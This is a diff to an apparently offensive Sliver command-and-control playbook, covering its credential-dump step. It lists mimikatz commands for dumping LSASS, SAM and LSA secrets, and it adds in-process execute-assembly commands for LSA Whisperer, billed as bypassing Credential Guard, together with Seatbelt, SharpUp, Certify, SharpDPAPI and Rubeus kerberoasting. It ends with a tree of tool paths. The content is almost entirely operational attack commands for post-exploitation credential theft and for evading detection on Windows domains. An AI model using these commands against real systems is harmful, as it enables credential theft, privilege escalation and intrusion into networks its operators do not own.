@@ -328,7 +328,7 @@ hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat
 ## Step 9: Credential Dump
 
 ```
-# mimikatz (in-process)
+# mimikatz (in-process via armory)
 mimikatz sekurlsa::logonpasswords
 mimikatz lsadump::sam
 mimikatz lsadump::secrets
@@ -343,6 +343,52 @@ sharpsecdump -- -target=localhost
 
 # hashdump (built-in)
 hashdump
+```
+
+### execute-assembly with Local Tools
+
+For tools NOT in the armory, use `execute-assembly` with local .exe files from `~/sliver/tools/`:
+
+```
+# LSA Whisperer — works even with Credential Guard enabled
+# Uses LsaCallAuthenticationPackage (never opens LSASS handle)
+execute-assembly --in-process ~/sliver/tools/lsa-whisperer/build/lsa-whisperer.exe credkey
+execute-assembly --in-process ~/sliver/tools/lsa-whisperer/build/lsa-whisperer.exe ntlmv1
+execute-assembly --in-process ~/sliver/tools/lsa-whisperer/build/lsa-whisperer.exe klist
+execute-assembly --in-process ~/sliver/tools/lsa-whisperer/build/lsa-whisperer.exe dump
+execute-assembly --in-process ~/sliver/tools/lsa-whisperer/build/lsa-whisperer.exe ssocookie
+
+# Seatbelt — full host recon
+execute-assembly --in-process ~/sliver/tools/sharp-tools/Seatbelt.exe -group=all
+
+# SharpUp — privesc checks
+execute-assembly --in-process ~/sliver/tools/sharp-tools/SharpUp.exe audit
+
+# Certify — AD CS enumeration
+execute-assembly --in-process ~/sliver/tools/sharp-tools/Certify.exe find /vulnerable
+
+# SharpDPAPI — DPAPI credential blobs
+execute-assembly --in-process ~/sliver/tools/sharp-tools/SharpDPAPI.exe triage
+execute-assembly --in-process ~/sliver/tools/sharp-tools/SharpDPAPI.exe machinecredentials
+
+# Rubeus (local copy — same as armory but always available)
+execute-assembly --in-process ~/sliver/tools/sharp-tools/Rubeus.exe kerberoast /format:hashcat /nowrap
+execute-assembly --in-process ~/sliver/tools/sharp-tools/Rubeus.exe triage
+```
+
+### Tool Paths (after setup.sh)
+
+```
+~/sliver/tools/
+├── lsa-whisperer/build/     # LSA Whisperer exe (Credential Guard bypass)
+├── lsawhisper-bof/          # LSA Whisperer BOF variant
+├── No-Consolation/          # In-memory PE loader
+└── sharp-tools/             # Pre-compiled .NET
+    ├── Rubeus.exe
+    ├── Seatbelt.exe
+    ├── SharpUp.exe
+    ├── Certify.exe
+    └── SharpDPAPI.exe
 ```
 
 ---
